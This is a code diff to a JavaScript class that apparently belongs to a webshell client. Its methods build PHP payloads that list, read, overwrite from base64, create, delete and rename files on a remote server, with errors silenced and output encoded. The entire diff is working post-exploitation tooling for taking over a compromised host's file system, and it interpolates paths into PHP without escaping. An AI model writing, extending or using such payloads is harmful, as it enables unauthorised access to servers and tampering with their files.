@@ -7,22 +7,23 @@ export default class File {
 
 
     dir() {
+        //todo 5.2不能跨目录
         return `
         $dir = '${arguments[1]}';
         if (!@is_dir($dir)) {
-            echo "ERROR:// Path Not Found Or No Permission!";
+            echo 'ERROR:// Path Not Found Or No Permission!';
         } else {
             $res = '';
             foreach (scandir($dir) as $value) {
                 if ($value === '.' || $value === '..') {
                     continue;
                 }
-                $file = $dir . $value;
+                $file = $dir .'/'. $value;
                 $res .= $value . '\`\`';
-                $res .= is_dir($file) ? '1' : '0';
+                $res .= (is_dir($file) ? '1' : '0') . '\`\`';
                 $res .= date("Y/m/d H:i", filemtime($file)) . '\`\`';
                 $res .= @filesize($file);
-                $res .= "\n";
+                $res .= '\n';
             }
             ${arguments[0]}
             encode($res);
@@ -79,41 +80,41 @@ export default class File {
 
     createFile() {
         return `
-       @file_put_contents('${this.arg1}', '');
+       @file_put_contents('${arguments[1]}', '');
        `
     }
 
     createFolder() {
         return `
-       @mkdir('${this.arg1}');
+       @mkdir('${arguments[1]}');
        `
     }
 
     read() {
         return `
-        echo @file_get_contents('${this.arg1}');
+        $res = @file_get_contents('${arguments[1]}'); ${arguments[0]} encode($res);
         `
     }
 
     change() {
-        return `@file_put_contents('${this.arg1}', base64_decode($_POST['${this.arg2}']));`
+        return `@file_put_contents('${arguments[1]}', base64_decode('${arguments[2]}'));`
     }
 
     deleteFile() {
         return `
-       @unlink('${this.arg1}');
+       @unlink('${arguments[1]}');
        `
     }
 
     deleteFolder() {
         return `
-       @rmdir('${this.arg1}');
+       @rmdir('${arguments[1]}');
        `
     }
 
     rename() {
         return `
-       @rename('${this.arg1}','${this.arg2}');
+       @rename('${arguments[1]}','${arguments[2]}');
        `
     }
 }
